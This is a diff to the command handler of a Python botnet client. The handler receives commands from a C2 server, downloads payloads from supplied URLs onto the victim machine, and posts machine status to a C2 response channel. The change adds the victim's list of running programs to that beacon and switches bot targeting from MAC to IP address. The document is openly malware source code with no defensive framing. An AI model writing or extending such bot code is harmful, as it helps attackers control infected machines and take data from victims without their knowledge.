@@ -18,7 +18,6 @@ from bots.dictionaries.CommunicationChannels import CommChannels
 
 # Handles the recieved commands from the C2 server and executes the corresponding actions on the bot's system
 class CommandHandler:
-    """ --- PRIVATE METHODS --- """
     def __init__(self, bot, crypt):
         self.bot = bot
         self.crypt = crypt
@@ -28,6 +27,8 @@ class CommandHandler:
         self.notificationBuilder = NotificationBuilder(self.crypt)
         self.cmdConverter = CommandConverter()
 
+
+    """ --- PRIVATE METHODS --- """
 
     # Download the payload from a specified URL and save it to the bot's system
     def __download_payload(self, id: str, params: list):
@@ -66,7 +67,8 @@ class CommandHandler:
     # Announce bot status to C2 server
     def __announce_status(self, id: str, params: list):
         mInfo = self.machineInfo.get_machine_info()
-        ntfy = self.notificationBuilder.build_notification(mInfo, Command.STATUS)
+        prgrmsRunning = self.exeHandler.get_running_programs()
+        ntfy = self.notificationBuilder.build_notification(mInfo, prgrmsRunning, Command.STATUS)
 
         r = requests.post(CommChannels["RESPONSE_CHANNEL"], data=ntfy.encode(encoding='utf-8'))
         if r.status_code == 200:
@@ -122,16 +124,15 @@ class CommandHandler:
         IS_FOR_ME = False
 
         if (not IS_FOR_ALL):
-            IS_FOR_ME = self.machineInfo.MAC_ADDR == params[0]
+            IS_FOR_ME = self.machineInfo.IP_ADDR in params
         
         if IS_FOR_ALL:
-            print("FOR ALL")
             func(id, params)
         elif IS_FOR_ME:
-            print("FOR ME")
             func(id, params)
         else:
             pass        
+
 
     """ --- PUBLIC METHODS --- """
 
